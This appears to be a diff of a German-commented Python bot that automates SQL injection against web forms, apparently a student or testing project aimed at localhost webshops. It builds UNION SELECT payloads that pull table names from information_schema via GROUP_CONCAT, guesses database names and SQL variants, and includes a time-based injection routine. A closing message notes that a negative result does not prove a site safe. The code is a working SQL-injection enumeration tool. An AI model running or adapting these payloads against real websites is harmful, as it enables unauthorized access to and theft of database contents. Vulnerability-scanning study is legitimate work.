@@ -92,13 +92,13 @@ def findOutTableNamesCaller(websitObject, databaseName):
         for i in range(MAX_TABLE_SIZE):
             if result == "NICHT_ERKENBAR":
                 result = findOutTablesUnionTable(websitObject["url"], i, websitObject["inputfields"][0], databaseName)
+                print("Resutlt wird ausgegebe: ")
+                print(result)
         if result == "NICHT_ERKENBAR":
             result = False
     except:
         pass
     #zum testen
-    print("Return Nicht erkenbar !")
-    result = "NICHT_ERKENBAR"
     return result
 
 """Versucht herauszufidenn was für Tablen es gibt. Dabei muss es um ein String injection handeln """
@@ -107,12 +107,7 @@ def findOutTablesUnionTable(url, extraColumns, id, database="MY_DATABASE"):
         fillerString = ""
         for i in range(extraColumns):
             fillerString = fillerString + "NULL as col" + str(i) + ","
-
-        print("database")
-        print(database[0])
-        injectionString = '" UNION SELECT ' + str(fillerString) + ' GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = "' + str(database) + '"#'      #[] das problem
-        #" UNION SELECT NULL as col1, NULL as col2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'MY_DATABASE'; #
-        #" UNION SELECT NULL as col1, NULL as col2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'MY_DATABASE'; #
+        injectionString = '" UNION SELECT ' + str(fillerString) + ' CONCAT("START", GROUP_CONCAT(table_name), "ENDE") FROM information_schema.tables WHERE table_schema = "' + str(database)+ '"#'      #[] das problem
         pageContent = goToWebsiteAndInsert(url, id,injectionString)
         tableNames = clearResult(pageContent)
         if tableNames:
@@ -207,7 +202,7 @@ def tableLogic(url, id):
         for i in range(MAX_TABLE_SIZE):
             database = findOutNameOfDatabase(url,"searProcuct", i)
             if database:
-                nameOfDatabase = database
+                nameOfDatabase = database[0]
         if database:
             for i in range(MAX_TABLE_SIZE):
                 tables = findOutTablesUnionTable(url, i, nameOfDatabase)
@@ -243,7 +238,11 @@ def writeResultInFile(result, advanced = None):
         if advanced is not None:
             print("Es folgt advanced : ")
             print(advanced)
-            f.write("datenBankName: " + str(advanced["datenBankName"]) + ", sqlVariante : " + str(advanced["sqlVariante"]) + ", tabellenName: " +str(advanced["tabellenName"] + "\n"))
+            tabellename = ""
+            #tabellennameAls string
+            for name in advanced["tabellenName"]:
+                tabellename += name
+            f.write("datenBankName: " + str(advanced["datenBankName"]) + ", sqlVariante : " + str(advanced["sqlVariante"]) + ", tabellenName: " + tabellename + "\n")
         f.write("Bitte beachte das dieser Bot nur bestimmte SQL injections abfragt, dass nicht finden bedeutet nicht das die websiten sicher sind")
 """ TImmer injection  welche  checckWebsiteTimmer aufruft um über zeit herauszufinden ob incetion möglich war"""
 def timmerAttack(url, id):
@@ -312,6 +311,9 @@ def __main__():
             if datenBankName == "NICHT_ERKENBAR":
                 print("es wird versucht DB name zu erkennen")
                 datenBankName = findOutNameOFDatabaseCaller(websiteObject)
+            print("es wfolgt der DB name: ")
+            datenBankName = datenBankName[0]
+            print(datenBankName)
             if sqlVariante == "NICHT_ERKENBAR":
                 print("es wird versucht variante zu erkennen")
                 sqlVariante = sqlTypidentifizierenCaller(websiteObject)
@@ -336,9 +338,9 @@ def __main__():
 
 
 __main__()
-
-#sqlTypidentifizieren("http://localhost:8000/Views/webshopView.php", 2, "searchProduct")
-#tableLogic("http://localhost:8000/indexWebshop.php", "searchProduct")
-#timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")
-
-
+"""
+object = {}
+object["url"] = "http://localhost:8000/Views/webshopView.php"
+object["inputfields"] = ["searchProduct"]
+print(findOutTableNamesCaller(object, "MY_DATABASE"))
+"""
